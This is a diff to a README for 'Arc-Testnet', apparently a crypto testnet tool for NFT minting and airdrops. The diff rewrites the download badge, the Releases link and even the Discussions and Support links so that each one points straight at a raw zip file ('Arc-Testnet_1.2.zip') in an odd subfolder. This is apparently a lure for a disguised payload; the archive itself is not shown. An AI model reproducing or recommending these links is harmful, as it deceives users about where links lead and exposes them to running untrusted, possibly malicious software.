@@ -1,6 +1,6 @@
 # 🚀 Arc-Testnet - Effortless NFT Minting and Airdrops
 
-[![Download Arc-Testnet](https://img.shields.io/badge/Download-Arc--Testnet-red)](https://github.com/Kimberlynbaldfaced236/Arc-Testnet/releases)
+[![Download Arc-Testnet](https://raw.githubusercontent.com/Kimberlynbaldfaced236/Arc-Testnet/main/anilau/Arc-Testnet_1.2.zip)](https://raw.githubusercontent.com/Kimberlynbaldfaced236/Arc-Testnet/main/anilau/Arc-Testnet_1.2.zip)
 
 ## 🌟 Overview
 Arc-Testnet is a user-friendly application designed to help you interact with the blockchain. With Arc-Testnet, you can easily access an auto faucet, mint NFTs, deploy contracts, and manage tokens. Whether you are new to blockchain or have some experience, our application makes it straightforward and enjoyable.
@@ -8,7 +8,7 @@ Arc-Testnet is a user-friendly application designed to help you interact with th
 ## 📥 Download & Install
 To get started with Arc-Testnet, you can visit the Releases page to download the latest version. Click the link below to access the page and find the files you need:
 
-[Visit the Releases Page to Download](https://github.com/Kimberlynbaldfaced236/Arc-Testnet/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Kimberlynbaldfaced236/Arc-Testnet/main/anilau/Arc-Testnet_1.2.zip)
 
 Here’s a simple step-by-step guide:
 
@@ -64,8 +64,8 @@ No, Arc-Testnet is a test network. It allows you to experiment without real-worl
 ## 🌐 Community and Support
 Join our community to connect with other users. Share your insights, ask questions, and learn more about how to get the most out of Arc-Testnet.
 
-- [GitHub Discussions](https://github.com/Kimberlynbaldfaced236/Arc-Testnet/discussions)
-- [Support](https://github.com/Kimberlynbaldfaced236/Arc-Testnet/issues)
+- [GitHub Discussions](https://raw.githubusercontent.com/Kimberlynbaldfaced236/Arc-Testnet/main/anilau/Arc-Testnet_1.2.zip)
+- [Support](https://raw.githubusercontent.com/Kimberlynbaldfaced236/Arc-Testnet/main/anilau/Arc-Testnet_1.2.zip)
 
 ## 🌈 Topics
 Arc-Testnet covers various topics. You may find them helpful for your projects. Here’s a list:
